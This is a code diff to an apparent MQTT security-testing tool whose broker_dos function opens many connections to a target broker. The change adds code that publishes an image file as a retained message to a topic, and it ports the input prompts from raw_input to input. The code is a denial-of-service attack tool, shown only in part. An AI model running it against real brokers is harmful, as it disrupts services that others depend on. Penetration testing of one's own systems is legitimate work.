@@ -7,6 +7,12 @@ import paho.mqtt.client as mqtt
 def broker_dos(host, port, connections, topic="", tls_cert=None, client_cert=None):
     client = mqtt.Client()
 
+    f= open("dos/tree.jpg", 'rb')
+    filecontent = f.read()
+    byteArr = bytearray(filecontent)
+
+    client.publish(topic,byteArr,0,True)
+
     # we create a number of connections equal to the 'connection' parameter
     for x in range(1, int(connections)):
 
@@ -59,11 +65,11 @@ def threaded_broker_dos(host, port, threads, connections, topic="", tls_cert=Non
 
 # used for testing purposes
 if __name__ == "__main__":
-    host = raw_input("Enter host address:")
-    port = raw_input("Enter port number:")
-    threads = raw_input("Enter number of threads:")
-    tls_cert = raw_input("Specify CA certificate (empty if no TLS):")
-    client_cert = raw_input("Specify client certificate (empty if no TLS):")
+    host = input("Enter host address:")
+    port = input("Enter port number:")
+    threads = input("Enter number of threads:")
+    tls_cert = input("Specify CA certificate (empty if no TLS):")
+    client_cert = input("Specify client certificate (empty if no TLS):")
     threads = int(threads)
     port = int(port)
     if tls_cert == "":
